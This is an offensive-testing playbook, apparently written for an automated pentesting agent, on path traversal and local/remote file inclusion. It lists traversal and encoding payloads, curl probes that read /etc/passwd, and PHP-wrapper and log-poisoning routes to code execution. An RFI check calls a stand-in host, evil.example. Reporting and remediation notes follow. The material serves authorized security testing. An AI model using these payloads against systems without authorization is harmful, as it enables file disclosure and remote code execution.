# Offensive Playbook: Path Traversal / Local & Remote File Inclusion (LFI/RFI)

## 1. Overview & Attack Surface
Path traversal breaks out of the intended directory via `../` sequences; LFI
includes local files (config, keys, `/etc/passwd`); RFI pulls attacker-hosted
code when URL wrappers are enabled. Impact ranges from credential theft to RCE
(log poisoning, PHP wrapper chains).

## 2. Classification & Detection
### A. Traversal probes
Fuzz file-ish params (`?file=`, `?page=`, `?template=`, `?lang=`, `?doc=`):
- `../../../../etc/passwd`, `....//....//etc/passwd` (filter strip),
  `..%2f..%2fetc/passwd` (encoding), `....\/` variants.
- Confirm marker: `root:x:0:0` in response. Windows targets: `..\..\windows\win.ini`.
Probe: `curl -s "TARGET/download?file=../../../../etc/passwd" | grep -m1 'root:x'`.

### B. LFI → RCE escalation (prove IMPACT)
- `/proc/self/environ` + User-Agent poisoning, then include the poisoned log.
- PHP wrappers (only where PHP indicated): `php://filter/convert.base64-encode/resource=index`
  for source disclosure; `data://text/plain,<?php system('id');?>` where allowed.
  Use `id` only — never destructive payloads.

### C. RFI check
`?page=https://evil.example/p.txt` (harmless marker file YOU host in lab only).
No outbound lab traffic to unowned hosts — confirm wrapper behavior, then stop.

### D. Secondary sinks
Zip-slip on archive upload, `tar --extract` paths, backup exposure
(`.bak`, `.old`, `~` suffixes on sensitive endpoints).

## 3. Sandbox Automated Validation
```bash
curl -s "TARGET/page?file=../../../../etc/passwd" | grep -m1 'root:x:0'
curl -s "TARGET/page?file=php://filter/convert.base64-encode/resource=index" | head -c 200
```

## 4. Verification & Reporting
1. `root:x` (or app config/keys) in response = Confirmed disclosure. Wrapper
   execution of `id` = Confirmed RCE. Blocked/filtered attempts = document and move on.
2. File finding via `create_vulnerability_report`:
   - **Category**: Path Traversal / File Inclusion (OWASP A01:2021, A04:2021)
   - **CWE**: CWE-22 (Path Traversal), CWE-98 (RFI), CWE-73 (External Control of File Name)
   - **CVSS 3.1**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base 9.8 Critical for RCE; 7.5 High for read-only)
   - **Remediation**: Indirect object map (IDs, never paths), canonicalize +
     jail to base dir, disable URL wrappers, deny sensitive extensions.
